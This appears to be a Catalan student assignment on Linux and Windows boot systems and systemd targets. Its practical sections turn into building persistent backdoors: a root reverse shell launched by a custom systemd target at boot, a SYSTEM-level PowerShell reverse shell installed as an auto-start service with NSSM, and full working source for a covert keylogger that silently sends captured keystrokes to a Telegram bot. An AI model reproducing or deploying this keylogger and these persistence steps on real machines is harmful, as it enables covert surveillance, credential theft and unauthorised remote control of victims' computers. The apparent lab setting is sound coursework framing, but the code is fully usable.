---
layout: default
title: SP1
---

# ASOPJ1 — SP1: SISTEMES D'INICI

> **Autor/a:** Razvan Nastasa Ghitau  
> **Mòdul:** ASOPJ1  
> **Data:** Setembre 2026  

---

# CONTINGUTS

## 1.- SystemV vs Upstart vs Systemd
* **1.1-** Runlevels o Targets?
* **1.2-** Quin és el nostre SO?

## 2.- SystemV
* **2.1-** Directoris
* **2.2-** Procés d'arrencada

## 3.- Systemd
* **3.1-** Directoris
* **3.2-** `systemctl`
* **3.3-** Dependències
* **3.4-** Modificar target provisional
* **3.5-** Modificar target definitiu
* **3.6-** Afegir/treure serveis de target

---

# CONCEPTES

| Concepte | Descripció |
| :--- | :--- |
| **Kernel** | Gestió de processos i recursos del sistema. |
| **Aplicació** | Programa que interactua amb l'usuari i s'executa en **1r pla** (*foreground*). |
| **Servei** | Programa associat al SO que s'executa en **2n pla** (*background*). |
| **Procés** | Funció/instància interna de treball del SO. |

> **Nota:** Les **aplicacions** i els **serveis** generen **processos** (que el Kernel s'encarrega de sincronitzar i planificar).

---

# NIVELLS D'EXECUCIÓ (*RUNLEVELS*)

| Nivell | Mode | Descripció |
| :---: | :--- | :--- |
| **0** | `power off` | Aturada del sistema. |
| **1** | `rescue` | Mode 1 usuari (amb dimonis mínims). |
| **2 - 5** | `multi-user` | Multiusuari, xarxa, amb/sense entorn gràfic. |
| **6** | `reboot` | Reinici del sistema. |

---

# COMANDES D'ATURADA

Exemple d'aturada del servei `cron` segons l'eina o entorn:

```bash
# Execució del script d'inici directament (SystemV)
/etc/init.d/cron stop

# Ús de la comanda de serveis (SystemV / Compatibilitat)
service cron stop

# Ús del controlador de sistemes i serveis (Systemd)
systemctl stop cron
```
---

## 1. SystemV vs Upstart vs Systemd

### 1.1. Runlevels o Targets?
<img width="1024" height="182" alt="image" src="https://github.com/user-attachments/assets/edb8bd09-354c-413f-a62a-e6bd7f7abce1" />

Amb la comanda `runlevel`, podrem comprovar el nivell d'execució actual. Aquesta comanda s'ha executat en Ubuntu 24, amb Ubuntu 26 no funciona i haurem de fer servir l'alternativa següent `systemctl get-default`:

<img width="338" height="74" alt="image" src="https://github.com/user-attachments/assets/a15bd0c1-a0a7-444f-a5e4-e3af87d43a6c" />

El _graphical.target_ correspon al runlevel 5. 


### 1.2. Quin és el nostre SO?

<img width="621" height="426" alt="image" src="https://github.com/user-attachments/assets/355c2e5c-ffd2-4297-aa63-2f9983c09df3" />

A través de la comanda `man init` o bé consultant la destinació de l'enllaç simbòlic `/sbin/init`:

<img width="418" height="70" alt="image" src="https://github.com/user-attachments/assets/880b0846-a62a-4402-821a-cd1acd49cb95" />

`readlink -v /sbin/init` Serveixen per comprovar quin sistema d'inici està actiu (en aquest cas _systemd_.)

---

## 2. SystemV

### 2.1. Directoris

<img width="606" height="189" alt="image" src="https://github.com/user-attachments/assets/d5711a7b-167a-41e9-a3a7-723bbd60981a" />

Tots els elements en verd corresponen a serveis. Si un servei es troba aquí, es pot reiniciar utilitzant el mètode indicat a continuació. Tot allò gestionat mitjançant l'estàndard SystemV s'allotja dins de `init.d`.

<img width="252" height="313" alt="image" src="https://github.com/user-attachments/assets/03b66dc9-24d8-4524-a8d3-6a8070a772b3" />

Dins de `/etc/` també s'hi troben els directoris `rcX.d` (*runlevels*): una carpeta específica per a cada nivell d'execució.

<img width="604" height="251" alt="image" src="https://github.com/user-attachments/assets/1a343376-e98a-45f1-a02c-9c3d99dfe4ca" />

Cada "rc" és per un nivell en concret.

### 2.2. Procés d'arrencada

<img width="282" height="29" alt="image" src="https://github.com/user-attachments/assets/2ba79580-8824-4d94-a0be-a829f2b9cef5" />

Amb `init 6` reiniciem.

<img width="287" height="38" alt="image" src="https://github.com/user-attachments/assets/2b867f57-b67d-4171-a1f8-ef79c6d3547a" />

Amb `init 0` apaguem.

---

## 3. Systemd

### 3.1. Directoris

<img width="611" height="646" alt="image" src="https://github.com/user-attachments/assets/1788191f-0448-4a64-a445-905e3a6fae08" />

`/lib/systemd/system` és el directori per defecte on s'instal·len les unitats de systemd. Aquest directori s'utilitza quan volem aplicar o modificar qualsevol configuració. En cas de duplicitat, les opcions editades a `/etc/` sempre tenen prioritat sobre les de `/lib/`.

### 3.2. systemctl

<img width="623" height="678" alt="image" src="https://github.com/user-attachments/assets/f5065b48-c89e-4137-88ef-e1afdb8eeca5" />

Per filtrar per tipus d'unitat: Per exemple, si llistem i filtrem els *targets* gestionats per systemd.

### 3.3. Dependències

<img width="449" height="65" alt="image" src="https://github.com/user-attachments/assets/ddd82b52-6592-4fed-8a0d-e9beaa81a37c" />

Amb aquesta comanda sabrem quin target per defecte tenim en tot moment.

<img width="1024" height="209" alt="image" src="https://github.com/user-attachments/assets/1d969a00-18c7-45ad-a5ec-4d56ca826ee0" />

<img width="870" height="860" alt="image" src="https://github.com/user-attachments/assets/4e115679-82ca-4c72-9d68-6bee9ab44d11" />

La comanda `systemctl list-dependencies` detalla, específicament, quines dependències han d'estar actives perquè el `graphical.target` s'iniciï correctament:


### 3.4. Modificar target provisional

<img width="477" height="45" alt="image" src="https://github.com/user-attachments/assets/e3cc2aa7-91db-48d1-bcf5-2d57d1412b9f" />

<img width="585" height="103" alt="image" src="https://github.com/user-attachments/assets/81328b0d-0394-4500-923f-c70f56b8df1f" />

Amb systemctl isolate i el target que volem executar al moment.

### 3.5. Modificar target definitiu

<img width="1024" height="352" alt="image" src="https://github.com/user-attachments/assets/d9ab90bb-aa84-44f7-8a22-0981615f1ffd" />

En cercar un *target* pel seu nom, com ara l'enllaç de `default.target`, veiem que habitualment apunta cap a `graphical.target` (l'entorn d'escriptori per defecte).

<img width="1024" height="55" alt="image" src="https://github.com/user-attachments/assets/ce2d5c21-b3fa-4fe3-b499-44e343b41b30" />


### 3.6. Afegir / treure serveis target

<img width="1024" height="55" alt="image" src="https://github.com/user-attachments/assets/22cd98d8-5e25-47be-98ab-1bfa8081d9a5" />

Si esborrem l'enllaç manualment (o bé fem servir `systemctl set-default`) i el tornem a generar apuntant directament cap al *target* que el sistema requereixi per procediment.

<img width="1024" height="371" alt="image" src="https://github.com/user-attachments/assets/7b6e8746-4ef0-4ca4-bdac-fead9aadc81a" />

L'entorn per defecte ja no serà el gràfic, sinó un de manteniment: rescue.target.

<img width="1024" height="227" alt="image" src="https://github.com/user-attachments/assets/b17baee7-d1f6-4acf-bdb5-99d1175c9855" />

Ho podem comprovar en fer un *reboot*: ens quedarem dins d'un *prompt* en *rescue mode* a l'espera de resoldre'l o de cancel·lar la reparació (després revertim els canvis per restaurar-ho).


---

## 4. Activitat Pràctica: Target Personalitzat i Serveis d'Accés Remot

### 🎯 Objectiu de l'activitat
1. Crear un **target personalitzat de systemd** amb el teu nom (`razvan.target`) que depengui d'un target existent (ex: `graphical.target`).
2. Configurar el nou target com el **target per defecte** de l'arrencada del sistema.
3. Associar i configurar un servei que iniciï una **sessió de TigerVNC**, de manera que altres usuaris puguin tenir accés complet a la interfície gràfica de l'ordinador.
4. Definir un **script executat amb permisos de `root`** associat al target per establir una **reverse shell** amb privilegis totals a l'inici del sistema.

---

### Pas 1: Instal·lem els paquets adients per TigerVNC

<img width="648" height="437" alt="image" src="https://github.com/user-attachments/assets/5d041bfa-ed71-4943-90ea-284654fc3db0" />

```bash
sudo apt install -y tigervnc-standalone-server tigervnc-common xfce4 xfce4-goodies
```

### Pas 2: Configurem la contrasenya del VNC

<img width="451" height="112" alt="image" src="https://github.com/user-attachments/assets/66337f38-e1fc-4427-93a6-118078e0b664" />

```bash
vncpasswd
```
Configurem una contrasenya amb control total ja que és el que ens interessa.

### Pas 3: Configurar el xstartup

<img width="355" height="70" alt="image" src="https://github.com/user-attachments/assets/fd5d2ec1-26d6-44c4-8f7b-24572d615be8" />

<img width="466" height="199" alt="image" src="https://github.com/user-attachments/assets/d9ffa2dd-2fac-48f0-8805-7243ccfea8c8" />


```bash
#!/bin/sh
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS
export XDG_SESSION_TYPE=x11
export XDG_CURRENT_DESKTOP=XFCE
export XDG_SESSION_DESKTOP=xfce
exec dbus-run-session -- startxfce4
```

<img width="829" height="345" alt="image" src="https://github.com/user-attachments/assets/1f77193a-b2d2-4662-ab40-1243aab5b5fc" />

Instal·lem el paquet dbus-x11.

### Pas 4: Creem el target personalitzat

<img width="550" height="177" alt="image" src="https://github.com/user-attachments/assets/a9518992-2f1d-478b-876d-b301ed9ecd7b" />

```bash
sudo nano /etc/systemd/system/razvan.target

[Unit]
Description=Razvan custom target
Requires=graphical.target
After=graphical.target
AllowIsolate=yes
```

### Pas 5: Definim el target com default.

<img width="643" height="139" alt="image" src="https://github.com/user-attachments/assets/788ea199-c483-43d5-bb06-27241368ce65" />

```bash
sudo systemctl set-default razvan.target
```

### Pas 6: Crear el servei de TigerVNC.

<img width="590" height="335" alt="image" src="https://github.com/user-attachments/assets/3643614b-daed-4e5e-ac54-49dcf2c3be67" />

```bash
sudo nano /etc/systemd/system/vncserver@.service
```

<img width="648" height="102" alt="image" src="https://github.com/user-attachments/assets/9685d08b-56d2-4004-9047-192f99f17fb8" />

L'habilitem al nostre usuari.

### Pas 7: Crear la reverse shell root.

<img width="610" height="282" alt="image" src="https://github.com/user-attachments/assets/a73125f0-0342-4bd9-9794-5e0987525fca" />

Primer creem el servei i després passarem a la creació del script.

<img width="610" height="298" alt="image" src="https://github.com/user-attachments/assets/928b35df-da56-47ce-b26f-7d8194047125" />

Creem una reverse shell bàsica, on el host serà la màquina atacant.

<img width="642" height="117" alt="image" src="https://github.com/user-attachments/assets/d92e1009-7952-4e25-917c-ebb955043980" />

Configurem els permissos d'execució del script i reiniciem el dimoni i activem el servei a l'arrancada del sistema. 

### Pas 8. Comprovació de reverse shell.

<img width="298" height="58" alt="image" src="https://github.com/user-attachments/assets/7fa338dd-55d5-4d83-a56d-2edc6186d2ec" />

Reiniciem la màquina

<img width="344" height="74" alt="image" src="https://github.com/user-attachments/assets/0356e1ef-097b-4ef4-b18c-966a9a5a532f" />

Un cop reiniciada la màquina comprovem el target per default que tenim. Podem veure que s'ha aplicat el nostre target correctament.

<img width="654" height="449" alt="image" src="https://github.com/user-attachments/assets/a44ceebe-cfbd-43f8-9ce2-b883e28a74f6" />

Comprovem que el servei per al server TigerVNC està viu.

<img width="755" height="311" alt="image" src="https://github.com/user-attachments/assets/b429e416-9821-47a7-b488-74fa4bc2e24c" />

Comproves també que el servei d'SSH s'ha iniciat. Podem veure que hi ha hagut un error (ens ha retornat error 1). Això és degut a que no hi havia ningú escoltant a la IP que hem assignat al número de port. Si abans de reiniciar la màquina encenem una escolta amb _netcat_ ja no tindrem aquesta fallada.

<img width="270" height="67" alt="image" src="https://github.com/user-attachments/assets/643d8ff4-4c32-46c7-a61c-ec50cccac7da" />

Encenem l'escolta al host (màquina atacant) i reiniciem la VM posteriorment.

<img width="795" height="311" alt="image" src="https://github.com/user-attachments/assets/76a8f5ac-4c3f-4b34-8692-fb19d4919080" />

Ara veiem que el servei s'ha iniciat correctament.

<img width="629" height="207" alt="image" src="https://github.com/user-attachments/assets/0c0562fd-62c2-4d0c-8954-b417ceea29c6" />

I al host veiem que tenim accés al terminal de la màquina virtual.

### Pas 9. Comprovació de server TigerVNC

<img width="450" height="183" alt="image" src="https://github.com/user-attachments/assets/270a5365-54ab-42b7-abda-d5a6a0d98b38" />

Obrim el programa de TigerVNC (l'haurem de tenir instal·lat al host prèviament) i introduïm la IP de la víctima i el nº de port adient.

<img width="408" height="207" alt="image" src="https://github.com/user-attachments/assets/23831ec5-9c0d-42ed-93f3-e2f741de9a56" />

Introduïm la contrasenya del VNC.

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/3695d1c1-ec00-4d1b-9a40-c486127b919f" />

I ja tindrem imatge.

## 5. Activitat Pràctica: Servei personalitzat a Windows amb NSSM

### Apartat 1. Reverse Shell amb Powershell sent usuari nt authority\system

<img width="505" height="288" alt="imatge" src="https://github.com/user-attachments/assets/4c37c9e0-e4d6-4482-9e59-7ccdd4253b6c" />

Obrim Powershell com a administrador.

<img width="575" height="198" alt="imatge" src="https://github.com/user-attachments/assets/6f57d0c2-9393-469d-8bc9-cec91fdadeb6" />

Comprovem que NSSM funciona.

<img width="815" height="630" alt="imatge" src="https://github.com/user-attachments/assets/b3179260-227e-4d8a-b064-3dbe4f73bffe" />

Generem el nostre script de reverse shell.

<img width="609" height="474" alt="imatge" src="https://github.com/user-attachments/assets/181898b5-3144-4a14-8df4-04a560e36568" />

El guardem amb format ps1.

<img width="578" height="279" alt="imatge" src="https://github.com/user-attachments/assets/cf59f24b-bfad-4441-9f1d-06feb62a10b0" />

Executem aquesta comanda i ens obrirà l'eina per instal·lar el servei de forma gràfica.

<img width="427" height="227" alt="imatge" src="https://github.com/user-attachments/assets/9628220d-62e5-42d1-b548-c8d167a1be95" />

Configurem els paràmetres;

Path (la ruta de Powershell)
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
Startup directory (on tinguem guardat el script ps1)
```bash
C:\Users\Usuari\Desktop\servei-nssm
```
Arguments
```bash
-ExecutionPolicy Bypass -NoProfile -File C:\Users\Usuari\Desktop\servei-nssm\script.ps1
```

<img width="424" height="232" alt="imatge" src="https://github.com/user-attachments/assets/9bc5273f-9677-4c08-8fe3-7789e22366e9" />
<img width="298" height="148" alt="imatge" src="https://github.com/user-attachments/assets/0e480d2f-d977-47a1-b97f-56089d0c9a3a" />

A la pestanya "details" posem un nom al servei. Després fem click sobre Install Service.

<img width="725" height="51" alt="imatge" src="https://github.com/user-attachments/assets/b55bb47a-4878-4e19-8e7f-7302b08fa639" />

Executem aquesta comanda per habilitar que s'encengui al arrancar el ordinador.

```bash
.\nssm.exe set ServeiSP1 Start SERVICE_AUTO_START
```
<img width="596" height="197" alt="imatge" src="https://github.com/user-attachments/assets/8b0574a1-174b-46bc-a3d6-cb3529cb55b6" />

Iniciem el servei i comprovem que funcioni. 

<img width="889" height="584" alt="imatge" src="https://github.com/user-attachments/assets/30255359-7c06-4370-b17c-4a456dde43b9" />

A services.msc podem veure que el servei està efectivament actiu.

Ara comprovem que la reverse shell funciona reiniciant l'ordinador. Haurem de tenir un nc escoltant al port 4444.

### Apartat 2. Keylogger amb enviament de dades a bot de Telegram.

<img width="800" height="624" alt="imatge" src="https://github.com/user-attachments/assets/15be4977-9f3f-49a5-8e23-6bb840e3ce9f" />

Entrem a Telegram i busquem @BotFather. Iniciem un xat i escrivim _/newbot_

<img width="486" height="483" alt="imatge" src="https://github.com/user-attachments/assets/bc7730d3-04ed-4c99-a52f-4b44aa9eb408" />

Li donem nom al bot i li assignem un usuari. En el ultim missatge ens haurà otorgat un token (està censurat). L'haurem de guardar.

<img width="514" height="620" alt="imatge" src="https://github.com/user-attachments/assets/a7c138b4-dfe6-45eb-99c5-3e861d8dd953" />

Li enviem un missatge al nostre bot per poder rebre el chat id.

<img width="427" height="906" alt="imatge" src="https://github.com/user-attachments/assets/d0065bb8-3cd6-40c0-8603-cc6ed65292bf" />

Accedim a _https://api.telegram.org/bot<TOKEN>/getUpdates_ i veurem el json. Haurem de buscar el chat id. 

<img width="947" height="696" alt="imatge" src="https://github.com/user-attachments/assets/c9b8c72d-9761-47eb-99f7-878636b8679d" />

Creem el script següent i el guardem en format ps1.

```bash

$botToken = "TOKEN"
$chatId   = "CHAT_ID"
$logFile  = "$env:TEMP\klog.txt"
$interval = 60   # segons entre enviaments

# ---------- 1. DEFINICIÓ DEL GANXO DE TECLAT ----------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Windows.Forms;

public class KeyHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Start() {
        _hookID = SetHook(_proc);
        Application.Run();   // bucle de missatges (necessari per rebre el ganxo)
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            string k = key.ToString();

            // Traducció simple de tecles especials
            if (k.Length == 1) {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), k);
            } else if (k == "Space") {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), " ");
            } else if (k == "Return") {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), Environment.NewLine);
            } else if (k == "Back") {
                // No podem esborrar del fitxer fàcilment; ho marquem
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[BACK]");
            } else {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[" + k + "]");
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies System.Windows.Forms

# ---------- 2. INICIAR EL GANXO ----------
# Executem el ganxo dins un Job perquè no bloquegi aquest fil
Start-Job -ScriptBlock {
    [KeyHook]::Start()
} | Out-Null

# ---------- 3. BUCLE D'ENVIAMENT A TELEGRAM ----------
while ($true) {
    Start-Sleep -Seconds $interval

    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content -and $content.Trim().Length -gt 0) {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
                    -Method Post `
                    -Body @{ chat_id = $chatId; text = $content } | Out-Null
                Clear-Content $logFile   # Buidar després d'enviar
            } catch {
                # Silenci: si falla l'enviament, no volem soroll
            }
        }
    }
}

```

<img width="605" height="469" alt="imatge" src="https://github.com/user-attachments/assets/562b495c-7e15-4ba4-901a-f717f4eda618" />

Guardem l'arxiu ps1.

